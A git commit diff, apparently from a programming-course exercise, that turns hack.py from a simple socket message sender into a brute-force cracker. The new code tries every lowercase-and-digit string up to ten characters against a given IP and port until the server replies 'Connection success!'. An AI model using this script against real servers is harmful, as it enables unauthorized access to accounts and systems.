aa73dcc1bb6689456b6585d813682db18522184e
ugrak <augrak@yandex.ru>
2021-09-30 06:31:55 +0300

    Second stage

--- hack.py
+++ hack.py
@@ -1,13 +1,28 @@
 import sys
 import socket
+from itertools import product
+from string import ascii_lowercase, digits
 
-if len(sys.argv) < 4:
-    print('Input: IP address, port and message for sending')
+
+def pass_gen():
+    for i in range(1, 11):
+        for combination in product(ascii_lowercase + digits, repeat=i):
+            yield ''.join(combination)
+
+
+if len(sys.argv) < 3:
+    print('Input: IP address and port for sending')
     sys.exit(1)
+ip, port = sys.argv[1], int(sys.argv[2])
 
+gen = pass_gen()
 with socket.socket() as client_socket:
-    ip, port, message = sys.argv[1], int(sys.argv[2]), sys.argv[3]
     client_socket.connect((ip, port))
-    client_socket.send(message.encode())
-    response = client_socket.recv(1024)
-    print(response.decode())
+    while True:
+        message = next(gen)
+        client_socket.send(message.encode())
+        response = client_socket.recv(256).decode()
+        if response == 'Connection success!':
+            client_socket.close()
+            break
+print(message)
